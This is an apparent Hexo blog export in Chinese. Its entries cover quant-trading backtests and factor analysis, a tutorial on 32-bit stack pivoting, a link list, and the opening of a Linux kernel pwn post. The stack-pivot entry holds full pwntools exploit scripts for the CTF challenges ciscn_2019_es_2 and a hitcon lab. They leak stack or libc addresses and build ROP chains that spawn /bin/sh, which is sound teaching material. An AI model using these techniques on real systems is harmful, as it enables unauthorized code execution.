<h1 id="量化策略回测"><a href="#量化策略回测" class="headerlink" title="量化策略回测"></a>量化策略回测</h1><h2 id="回测流程"><a href="#回测流程" class="headerlink" title="回测流程"></a>回测流程</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flowchart LR</span><br><span class="line">    A[选择股票池和实现回测函数] --&gt; B[设定回测时间段,初始金额及调仓频率]</span><br><span class="line">    B --&gt; C[历史数据载入]</span><br><span class="line">    C --&gt; D[处理订单]</span><br><span class="line">    D --&gt; E[取消未完成订单]</span><br><span class="line">    E --&gt; F[输出日志]</span><br><span class="line">    F --&gt; G[生成回测报告]</span><br></pre></td></tr></table></figure>

<ul>
<li><p>选择股票池和实现回测函数 实现handle_data函数 编写量化交易策略</p>
</li>
<li><p>选定一个回测开始时间和结束日期 选择初始金额和调仓频率</p>
</li>
<li><p>取得股票数据 调用handle_data()函数</p>
</li>
<li><p>下单后，根据接下来时间的实际交易情况，处理订单</p>
</li>
<li><p>下单后，可以调用get_open_orders()取得所有未完成订单，调用cancel_order取消订单</p>
</li>
<li><p>可在任何时间打印日志</p>
</li>
<li><p>回测结束，生成回测报告，画出收益曲线和基准收益曲线，列出每日持仓和交易情况</p>
</li>
</ul>
<h2 id="MACD-2"><a href="#MACD-2" class="headerlink" title="MACD"></a>MACD</h2><p>金叉买入，死叉卖出</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jqdata</span><br><span class="line"><span class="keyword">from</span> jqlib.technical_analysis <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params">context</span>):</span><br><span class="line">    <span class="comment">#设定基准沪深300</span></span><br><span class="line">    set_benchmark(<span class="string">&#x27;000300.XSHG&#x27;</span>)</span><br><span class="line">    <span class="comment">#开启动态复权</span></span><br><span class="line">    set_option(<span class="string">&#x27;use_real_price&#x27;</span>, <span class="literal">True</span>)</span><br><span class="line">    <span class="comment">#设定标的</span></span><br><span class="line">    g.security = <span class="string">&#x27;000001.XSHE&#x27;</span></span><br><span class="line">    <span class="comment">#设置MACD的初始化值</span></span><br><span class="line">    g.macd_yesterday = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_data</span>(<span class="params">context, data</span>):</span><br><span class="line">    security = g.security</span><br><span class="line">    <span class="comment"># 计算当天的MACD</span></span><br><span class="line">    DIF,DEA,_MACD = MACD(security_list = security,check_date=context.current_dt,</span><br><span class="line">                        SHORT=<span class="number">6</span>,LONG=<span class="number">12</span>,MID=<span class="number">9</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#获取当日现金</span></span><br><span class="line">    cash = context.portfolio.cash</span><br><span class="line">    <span class="comment">#计算金叉</span></span><br><span class="line">    <span class="keyword">if</span> g.macd_yesterday &lt; <span class="number">0</span> <span class="keyword">and</span> _MACD[security] &gt; <span class="number">0</span> <span class="keyword">and</span> cash &gt; <span class="number">0</span>:</span><br><span class="line">        order_value(security,cash)</span><br><span class="line">    <span class="comment">#计算死叉</span></span><br><span class="line">    <span class="keyword">elif</span> g.macd_yesterday &gt; <span class="number">0</span> <span class="keyword">and</span> _MACD[security] &lt; <span class="number">0</span> <span class="keyword">and</span> context.portfolio.positions[security].closeable_amount &gt; <span class="number">0</span>:</span><br><span class="line">        order_target(security,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#更新当天MACD值</span></span><br><span class="line">    g.macd_yesterday = _MACD[security]</span><br></pre></td></tr></table></figure>

<h2 id="量化回测的风险指标"><a href="#量化回测的风险指标" class="headerlink" title="量化回测的风险指标"></a>量化回测的风险指标</h2><p>定义：即股票投资收益率的<strong>不确定性</strong>通常称之为<strong>风险</strong>，具体是指股票市场的一些未知的、不可预测的因素对股票价格造成的不确定的影响，可能是正面影响收益率，也可能是负面的背离。风险指标是对<strong>风险的量化评估</strong>。</p>
<p>特点：风险指标有利于投资者对投资策略进行一个客观的评价。无论是回测还是模拟，所有风险指标都会根据<strong>每天收益后的收益计算</strong>更新一次，并<strong>不考虑每盘中的收益情况</strong>。</p>
<p>定义：Alpha是投资者获得与市场波动无关的回报。阿尔法系数，是基金&#x2F;投资的绝对回报和按照beta系数计算的预期回报之间的差额。阿尔法收益与风险相关性很低。</p>
<p>算法：绝对收益或超额收益是基金&#x2F;投资的<strong>实际收益减去无风险投资收益</strong>。例如投资者获得了15%的回报，其基准获得了10%的回报，那么Alpha部分就是5%。</p>
<p>公式：Alpha &#x3D; 投资年化收益率 - [无风险回报率+Beta*(基准年化收益率 - 无风险回报率)]</p>
<p>beta：表示投资的系统性风险，反映了策略对大盘变化的敏感性。例如一个策略的Beta为1.5，则大盘涨1%的时候，策略可能涨1.5%，反之亦然；如果一个策略的Beta为-1.5，说明大盘涨1%的时候，策略可能跌1.5%，反之亦然。</p>
<p>夏普比率：表示每承受一单位总风险，会产生多少的超额报酬，可以<strong>同时对策略的收益与风险进行综合考虑</strong>。（越高越好）</p>
<p><a href="https://www.joinquant.com/help/api/help#%E9%A3%8E%E9%99%A9%E6%8C%87%E6%A0%87">各种风险指标详细参考</a></p>
<h1 id="因子分析"><a href="#因子分析" class="headerlink" title="因子分析"></a>因子分析</h1><h2 id="因子分析概述"><a href="#因子分析概述" class="headerlink" title="因子分析概述"></a>因子分析概述</h2><p>就是根据因子或特定的特征使我们能赚钱的方法。包括波动性、动量、股票规模等。</p>
<p>综述一下，就是根据<strong>财务指标和技术指标</strong>作为因子（因子构造），通过选定的因子来选股（因子选股），构建股票池，策略回测（再优化）</p>
<h2 id="自定义因子"><a href="#自定义因子" class="headerlink" title="自定义因子"></a>自定义因子</h2><p>自定义因子类继承了factor类，三个基本属性，分别为<strong>name、max_window和dependencies</strong>；一个核心函数——calc()</p>
<p>构建自定义因子流程：构造因子属性—-&gt;实现因子计算—–&gt;因子分析</p>
<ul>
<li>name，因子名称。因子名称只能由字母、数字和下划线组成，并且第一个字符不能是数字，另外不能与Python中的关键字相同，也不能与基础因子冲突。</li>
<li>max_window，获取数据的最长时间窗口，返回日线数据。</li>
<li>dependencies，自定义因子依赖的基础因子名称，如high, low, close。</li>
</ul>
<p>**因子计算：**实现Factor类内置calc()函数  calc(self,data)</p>
<ul>
<li>data：字典对象</li>
<li>key属性是dependencies中的因子名称</li>
<li>value属性是因子对应的数据表(pandas.DataFrame格式)</li>
</ul>
<p>示例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">self,data</span>):</span><br><span class="line">    <span class="keyword">return</span> data[<span class="string">&#x27;close&#x27;</span>][-<span class="number">10</span>].mean()</span><br></pre></td></tr></table></figure>

<p>返回：Pandas.Series：index属性是股票代码，value属性是因子值</p>
<p>**单因子分析：**调用analyze_factor</p>
<p><code>analyze_factor(factor,start_date,end_date,industry,universe,quantiles,periods,weight_method,use_real_price,skip_paused,max_loss,factor_dep_definitions)</code></p>
<ul>
<li><p>factor: 获取因子值，可输入三种类型的值</p>
<ol>
<li>pandas.DataFrame: 因子值，columns为股票代码（如’000001.XSHE’），index为日期的DatetimeIndex或str</li>
<li>pandas.Series: 因子值，index为日期索引和股票代码的MultiIndex</li>
<li>Factor的子类，自定义因子</li>
</ol>
</li>
<li><p>start_date: 开始日期；end_date: 结束日期</p>
</li>
<li><p>industry: 获取行业分类，默认值为’jq_l1’    ‘sw_l1’:申万一级行业；’sw_l2’:申万二级行业；’sw_l3’:申万三级行业；’jq_l1’:聚宽一级行业；’jq_l2’:聚宽二级行业；’zjw’: 证监会行业</p>
</li>
<li><p>universe: 对<strong>股票池</strong>的定义，可输入两种类型的值。为str时认为输入的是一个股票池；当factor输入为因子值时(DataFrame、Series)，该参数无效</p>
</li>
<li><p>quantiles: 分位数数量，默认5</p>
</li>
<li><p>periods: 调仓周期，int或int的列表，默认[1, 5, 10]</p>
</li>
<li><p>weight_method: 计算分位数收益时的加权方法；avg: 按平均加权；mktcap: 按市场加权</p>
</li>
<li><p>use_real_price: 是否使用复权，默认False（当factor为因子值时这个参数失效）</p>
</li>
<li><p>skip_paused: 是否跳过停牌，默认False（当factor为因子值时这个参数失效）</p>
</li>
<li><p>max_loss: 因重置值或nan值太多而无效的因子值的最大占比，默认0.25 </p>
</li>
<li><p>factor_dep_definitions: 主因子的依赖因子的列表，默认为空列表（注：当factor为因子值时这个参数失效）</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> jqfactor <span class="keyword">import</span> Factor,analyze_factor</span><br><span class="line">warnings.filterwarnings(<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MA10</span>(<span class="title class_ inherited__">Factor</span>):</span><br><span class="line">    <span class="comment">#因子名称为&#x27;ma10&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;ma10&#x27;</span></span><br><span class="line">    <span class="comment">#设定最长时间窗口</span></span><br><span class="line">    max_window = <span class="number">10</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#设置依赖的基础因子</span></span><br><span class="line">    dependencies = [<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#实现因子计算</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc</span>(<span class="params">self,data</span>):</span><br><span class="line">        <span class="keyword">return</span> data[<span class="string">&#x27;close&#x27;</span>][-<span class="number">10</span>:].mean()</span><br><span class="line">    </span><br><span class="line"><span class="comment">#单因子分析</span></span><br><span class="line">far = analyze_factor(factor=MA10,start_date=<span class="string">&#x27;2022-01-01&#x27;</span>,end_date=<span class="string">&#x27;2022-06-30&#x27;</span>,weight_method=<span class="string">&#x27;mktcap&#x27;</span>,</span><br><span class="line">                    universe=<span class="string">&#x27;000300.XSHG&#x27;</span>,industry=<span class="string">&#x27;jq_l1&#x27;</span>,quantiles=<span class="number">8</span>,periods=(<span class="number">1</span>,<span class="number">5</span>,<span class="number">10</span>))</span><br><span class="line"><span class="comment">#分析结束后通过不同属性获取数据</span></span><br><span class="line"><span class="comment">#月度信息系数</span></span><br><span class="line">far.ic_monthly</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<p><strong>害，突然觉得量化基于这些指标的操作我并不喜欢，或者说我觉得量化的这些策略并没太大好处，就到这了</strong></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>栈迁移</title>
    <url>/2025/03/21/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>本文讨论的原理，都是针对于32位程序的栈迁移来说的，例题里面有一道是64位的栈迁移</p>
<h3 id="1、什么是栈迁移"><a href="#1、什么是栈迁移" class="headerlink" title="1、什么是栈迁移"></a>1、什么是栈迁移</h3><p> 这里我谈谈自己的理解，简单一句话：<strong>栈迁移就是控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面），此时新的问题随之产生，为什么要换个地方GetShell，这就是下一段要说的为什么要使用栈迁移。</p>
<h3 id="2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）"><a href="#2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）" class="headerlink" title="2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）"></a>2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</h3><p>言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p>
<p> 使用栈迁移的条件：</p>
<ul>
<li>要能够溢出</li>
<li>有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</li>
<li>可以控制sp寄存器</li>
</ul>
<h3 id="3、学习栈迁移需要自身掌握什么知识"><a href="#3、学习栈迁移需要自身掌握什么知识" class="headerlink" title="3、学习栈迁移需要自身掌握什么知识"></a>3、学习栈迁移需要自身掌握什么知识</h3><ul>
<li>需要掌握汇编基础</li>
<li>较为熟悉栈结构</li>
<li>熟悉函数调用与结束时栈的变化。</li>
</ul>
<p>如果掌握了这些知识，那么理解下面的内容就不会太费力气了。当然如果你会用gdb进行调试的话，通过自己的动手调试，你将理解的更为透彻。如果你和我当初一样，也是对栈迁移一无所知，那么希望你可以仔细阅读下面的内容，我会帮你彻底理解它。</p>
<h3 id="4、栈迁移的原理"><a href="#4、栈迁移的原理" class="headerlink" title="4、栈迁移的原理"></a>4、栈迁移的原理</h3><h5 id="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例"><a href="#ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例" class="headerlink" title="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例"></a>ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0e:0038│ ebp 0xffffd0c8 —▸ 0xffffd0d8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br></pre></td></tr></table></figure>



<p> ebp是0xffffd0c8，它的内容是0xffffd0d8，而这个内容也是一个地址，这个地址里面装的又是0xf7ffd020。ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）。我这里想强调的是<em><strong>ebp和ebp的内容这两者一定不能混为一谈</strong></em>，在阅读下面的内容是，一定要注意区分两者。</p>
<h3 id="栈迁移的核心，就在于两次的leave-ret指令上面"><a href="#栈迁移的核心，就在于两次的leave-ret指令上面" class="headerlink" title="栈迁移的核心，就在于两次的leave;ret指令上面"></a><strong>栈迁移的核心，就在于两次的leave;ret指令上面</strong></h3><p> leave指令即为mov esp ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将<strong>栈顶的内容</strong>弹入ebp（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。具体实现请见下图：</p>
<img data-src="../images/image-20241120213824271.png" alt="image-20241120213824271" style="zoom:50%;" />

<p> ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip（就是下一条指令执行的地址）具体实现请见下图：</p>
<p><img data-src="/../images/2706180-20220118102755803-79970067.png" alt="2706180-20220118102755803-79970067"></p>
<p>若这个ret_address为<code>leave;ret</code>且<code>fake_frame</code>为我们精心构造的栈帧，就可以实现将esp寄存器也迁移到我们精心构造的栈帧，从而实现get_shell等操作，具体实现请见下图：</p>
<p><img data-src="/../images/image-20241120220941300.png" alt="image-20241120220941300"></p>
<p>栈迁移的例题有以下几种：</p>
<p>攻防世界上的greeting-150</p>
<p>BUUCTF上的[Black Watch 入群题]</p>
<p>BUUCTF上的ciscn_2019_es_2</p>
<p>BUUCTF上的gyctf_2020_borrowstack</p>
<p> 它们考察了在迁移到栈，迁移到bss段，从main函数结束时迁移，从main函数调用的函数结束时迁移，和64位的栈迁移以及ret2csu。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>拖入ida中反编译如下，32位只有NX保护：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>大概思路就是，我们要用第一个read来泄露下ebp的地址**（因为是printf来打印字符串，参数是%s，因此是遇见00才停止打印，只要我们第一次read正好输入0x28个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了）**，然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方），</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">                   <span class="comment">#bin_sh的指针         #填充够0x28 |  ebp    |    ret              </span></span><br><span class="line">|system@plt|p32(<span class="number">0</span>)|p32(buf+<span class="number">12</span>)|/<span class="built_in">bin</span>/sh\x00|\x00...|p32(buf-<span class="number">4</span>)|p32(leave_ret)</span><br></pre></td></tr></table></figure>

<p>参数分布参考上图</p>
<p>后面的p32(buf-4) + p32(leave) p32(buf-4) 是将ebp覆盖成buf的地址-4 为什么要-4？这是因为我们利用的是两个leave，但是第二个 leave的pop ebp，在出栈的时候会esp+4。就会指向esp+4的位置， p32(leave) ,将返回地址覆盖成leave 到这里，我们成功将栈劫持到了我们的buf处，接下来就会执行栈里的内容 完整exp见解题过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28649</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">2</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">b&#x27;aabb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&quot;ebp&quot;</span>,ebp)</span><br><span class="line">sh = ebp-<span class="number">0x38</span>+<span class="number">16</span></span><br><span class="line">rop = flat([<span class="number">0</span>,elf.plt[<span class="string">&#x27;system&#x27;</span>],<span class="number">0</span>,sh,<span class="string">b&#x27;/bin&#x27;</span>,<span class="string">b&#x27;/sh\x00&#x27;</span>])</span><br><span class="line">payload = rop.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(ebp-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="hitcon-lab"><a href="#hitcon-lab" class="headerlink" title="hitcon lab"></a>hitcon lab</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;192.168.6.128&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x804ae00</span></span><br><span class="line">buf2 = buf+<span class="number">0x200</span></span><br><span class="line"><span class="comment">#这两个buf是data段靠后的那一块任取的	</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">rop = flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">0x100</span>])</span><br><span class="line">payload += rop</span><br><span class="line">s(payload)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">pop1ret = <span class="number">0x0804836d</span></span><br><span class="line">rop2 = flat([buf2,elf.plt[<span class="string">&#x27;puts&#x27;</span>],pop1ret,elf.got[<span class="string">&#x27;puts&#x27;</span>],read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">0x100</span>])</span><br><span class="line">sl(rop2)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">puts = u32(p.recvline().strip())</span><br><span class="line">lg(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base = puts - <span class="number">0x732a0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system = libc_base + <span class="number">0x48170</span></span><br><span class="line">sh = buf2 + <span class="number">16</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">rop3 = flat([buf,system,<span class="number">0</span>,sh,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>])</span><br><span class="line">sl(rop3)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>有用的东西</title>
    <url>/2025/04/15/%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">[pwn]调试：gdb+pwndbg食用指南</a></p>
<p> <a href="https://roderickchan.github.io/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/">Glibc高版本堆利用方法总结</a></p>
<p><a href="https://www.roderickchan.cn/zh-cn/2023-02-27-house-of-all-about-glibc-heap-exploitation/"><strong>Glibc 堆利用之 house of 系列总结</strong></a></p>
]]></content>
  </entry>
  <entry>
    <title>linux kernel pwn</title>
    <url>/2025/07/26/linux%20kernel%20pwn/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/basic-knowledge/">参考链接-ctfwiki</a></p>
<p><img data-src="/../images/kernel%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86.png" alt="kernel基础知识">下面是学习时收集的AI(gemini2.5pro)问答和自己写的</p>
<table>
<thead>
<tr>
<th>项目</th>
<th>您的 Ubuntu 22.04_amd64 VM</th>
<th>Linux Kernel arm64</th>
<th>QEMU 的角色</th>
</tr>
</thead>
<tbody><tr>
<td><strong>角色</strong></td>
<td><strong>开发平台 &#x2F; 工厂</strong></td>
<td><strong>目标产品</strong></td>
<td><strong>测试平台 &#x2F; 模拟器</strong></td>
</tr>
<tr>
<td><strong>架构</strong></td>
<td>amd64 &#x2F; x86-64</td>
<td>arm64 &#x2F; AArch64</td>
<td>自身是amd64程序，但能模拟arm64硬件</td>
</tr>
<tr>
<td><strong>关系</strong></td>
<td>在这里<strong>编译</strong>和<strong>准备</strong>arm64内核。</td>
<td>在这里<strong>被编译</strong>和<strong>被准备</strong>。</td>
<td>在amd64平台上为arm64内核提供<strong>运行环境</strong>。</td>
</tr>
</tbody></table>
<h2 id="关于64位128TB-用户空间-128TB-内核空间"><a href="#关于64位128TB-用户空间-128TB-内核空间" class="headerlink" title="关于64位128TB 用户空间 + 128TB 内核空间"></a><strong>关于64位128TB 用户空间 + 128TB 内核空间</strong></h2><p>您提到的数字非常具体，这涉及到 x86-64 架构的一个特定设计。</p>
<ul>
<li><strong>64位的潜力</strong>：一个 64 位的指针理论上可以寻址 2^64 字节，这大约是 16 EB (Exabytes)，一个天文数字。</li>
<li><strong>现实的限制 (Canonical Addresses)</strong>：目前的 x86-64 架构 CPU 并没有使用全部 64 位来寻址，而是通常只使用了<strong>低 48 位</strong>。这要求一个有效的地址，其第 47 位到第 63 位必须全部相同（要么全是 0，要么全是 1）。这种规范格式的地址被称为<strong>规范地址 (Canonical Address)</strong>。<ul>
<li>这 48 位地址空间提供了 2^48 &#x3D; <strong>256 TB</strong> 的虚拟地址空间。</li>
</ul>
</li>
<li><strong>内核与用户的划分</strong>：Linux 内核非常巧妙地利用了这个“规范地址”的特点，将这 256TB 的虚拟地址空间一分为二：<ul>
